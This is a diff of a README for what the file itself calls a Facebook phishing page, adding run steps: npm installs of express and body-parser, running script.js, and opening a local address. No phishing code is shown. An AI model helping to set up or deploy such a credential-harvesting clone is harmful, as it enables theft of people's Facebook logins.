@@ -13,3 +13,16 @@ Phishing page of Facebook.
 
 5. We reserve the right to modify the Disclaimer at any time without notice.
 
+
+
+**How to run**
+
+I     Install the following packages.
+      1. npm install express
+      2. npm install body-parser
+
+II    Run the following in the terminal.
+      node script.js
+
+III   Goto 127.0.0.1:3000
+
